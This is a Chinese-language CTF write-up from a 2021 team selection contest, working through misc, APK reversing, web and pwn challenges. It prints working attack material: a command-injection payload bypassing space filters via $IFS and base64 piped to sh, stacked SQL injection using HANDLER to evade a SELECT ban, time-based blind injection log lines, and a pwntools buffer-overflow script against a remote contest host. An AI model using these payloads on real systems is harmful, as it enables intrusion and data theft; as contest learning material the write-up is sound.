---
title: tjuctf{welcome_TO_D.I.E}
date: 2021-8-15
category: webSecurity
tags: CTF
---

<center>2021年D.I.E战队夏季选拔赛WP</center>

<center>第一次CTF</center>

<!--more-->

## Misc

### find_commit

```shell
$ git show
commit feaeda4640284b05f1975f739c661b691501be12 (HEAD -> master)
Author: pushinl <pushinliu@gmail.com>
Date:   Mon Aug 2 14:42:59 2021 +0800

    remove passwd

diff --git a/test1.md b/test1.md
index 5ce802f..86dc73f 100644
--- a/test1.md
+++ b/test1.md
@@ -1,3 +1,3 @@
 ###  Accounts

-- Password: tjuctf{cd04ebfec0e9ec32}
+- Password: **REMOVED**

```

### Linked_out

- 搜索张伟and金属，跳到全部筛选条件，添加地点筛选“天津市”

  > 最开始没有就一条一条找，看到那个代码，对paste Ubuntu不敏感（当时看到群里有个张伟的访问记录，没有头像就略过了）

- 看到奇怪代码`R72rGRhqn`，点进去跳转到[*paste Ubuntu*](https://paste.ubuntu.com/)

- 随便乱输，生成后看url`https://paste.ubuntu.com/p/xxxxxxx/`

- 访问`https://paste.ubuntu.com/p/vR72rGRhqn/`

### Reverse

### apk

- 安装apk，得到错误信息`wrong`

  [![fcRvNR.jpg](https://z3.ax1x.com/2021/08/15/fcRvNR.jpg)](https://imgtu.com/i/fcRvNR)

- `jeb`打开，看代码，根据错误信息找到加密函数

- 然后写脚本解码

```java
//041A051304160B091F052F3B3E1F071E2F31203B0D 两个一组，转Integer，脚本没保存
{04 = 4,..............}

import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;
import java.util.LinkedHashMap;
import java.util.stream.Collector;
import java.util.stream.Collectors;
import java.util.Comparator;
import java.util.TreeMap;
public class Counta{
    public static void main(String[] args) {
        //按需输入数字大小写字母，常见字符，机械复现
        String vo = "";
        byte[] vo_1 = vo.getBytes(StandardCharsets.UTF_8);
        int v1;
        Map<Character, Byte> map = new HashMap<>();
        for(v1=0; v1< 13; ++v1){
            vo_1[v1] = ((byte)(vo_1[v1] ^ 0x70));
            map.put(vo.charAt(v1), vo_1[v1]);
        }
        System.out.println(map.size());
        System.out.println(map);
    }
}
//output
{a=17, b=18, c=19, d=20, e=21, f=22, g=23, h=24, i=25, j=26, k=27, l=28, m=29, n=30, o=31, 

p=0, q=1, r=2, s=3, t=4, u=5, v=6, w=7, x=8, y=9, z=10}



{A=49, B=50, C=51, D=52, E=53, F=54, G=55, H=56, I=57, J=58, K=59, L=60, M=61, N=62, O=63, P=32, Q=33, R=34, S=35, T=36, U=37, V=38, W=39, X=40, Y=41, Z=42}



{`=16, @=48, !=81, #=83, $=84, %=85, (=88, *=90, +=91, -=93, ==77, ~=14, _=47}
                                      
//手动对照
tjuctf{you_KNow_APK}
```

## Web

### welcome to CTF world

- F12，Network，JS,刷新，`main.js`

### ping_base

- ls，没回显
- url含ip
- 试试`127.0.0.1|ls -alh`，空格过滤
- `127.0.0.1|ls`
- 搜索绕过过滤的办法`127.0.01|echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh`

[![fcfwWt.md.png](https://z3.ax1x.com/2021/08/15/fcfwWt.md.png)](https://imgtu.com/i/fcfwWt)

- 拿到base64，在线解码

  ```php+HTML
  PD9waHAKCSRmbGFnID0gInRqdWN0ZntZMHVfNFIzX1AxbmdfcDFOZ19QMW5HX000NXQzUn0iOwo/Pg==
  
  <?php
  	$flag = "tjuctf{Y0u_4R3_P1ng_p1Ng_P1nG_M45t3R}";
  ?>
  ```

  



### sql233

> 搜索 CTF web sql 注入，了解这类题是从数据库拿到flag

- 随便输，url有个inject

- `1'`报错看到` MariaDB`，应该是=''的形式

- `1';show tables;`拿到表名

- `1';use findflag;`好像没啥反应

- 那就select，发现被ban，尝试各种绕过的方法（不同编码，注释，`concat`......）要么过滤，要么没有回显

- 和出题人py，得知select直接被ban，搜索select之外的查询方法

  > 搜索Mysql "查询" -select等等，反正搜不到

- 没办法去看[官方文档](https://dev.mysql.com/doc/refman/8.0/en/)

- `a few moments later`搜索select，在和select同级的目录下，看到handler

  ```sql
  HANDLER tbl_name OPEN [ [AS] alias]
  
  HANDLER tbl_name READ index_name { = | <= | >= | < | > } (value1,value2,...)
      [ WHERE where_condition ] [LIMIT ... ]
  1';handler `findflag` open;handler `findflag` read first;
  tjuctf{Y0u_4R3_SQl_1nJ3cT10n_M45t3R}
  ```

  



### web_log

- 改成.log，方便查看，前面对解题没啥意义，后面看到有规律的注入，
- 看到if（）MID（）函数，搜索函数用法，知道对应上就继续，不对应就sleep
- 翻到39，看到`%7D`，确认思路没问题
- 浏览过程中，在关键数据处，时间有偏差，不好写脚本

```web-idl
手动记录的时候，看到有这种差1s的
192.168.80.1 - - [01/Mar/2019:10:42:37 -0500] "GET /web/admin/sql.php?id=-1%20union%20select%201,IF(MID((select%20f1ag%20from%20f1ag%20limit%200,1),30,1)=binary('x'),1,sleep(3)) HTTP/1.1" 200 4017 "-" "python-requests/2.21.0"
192.168.80.1 - - [01/Mar/2019:10:42:41 -0500] "GET /web/admin/sql.php?id=-1%20union%20select%201,IF(MID((select%20f1ag%20from%20f1ag%20limit%200,1),30,1)=binary('y'),1,sleep(3)) HTTP/1.1" 200 4017 "-" "python-requests/2.21.0"
```

- 时间不变处，记录数据


## pwn

> 主要参照B站[视频](https://www.bilibili.com/video/BV1bK4y1j7Nr)

- kali `file` `checksec`
- `./pwnpwn`
- 拿到一个`give_flag`
- 跟着视频，跑到ida里面，但题目毕竟不一样，直接放弃
- gdb调试，run 拿到一个`0x61616161`，`cyclic -l aaaa` 17
- 脚本

```python
from pwn import *
p = remote('116.62.107.46','7114')

p.recvuntil('&give_flag = ')
buf = int(p.recv(10),16)
#偏移量20是试出来的
shellAddr = b'a'*20+p32(buf)

p.sendline(shellAddr)
p.interactive()
```

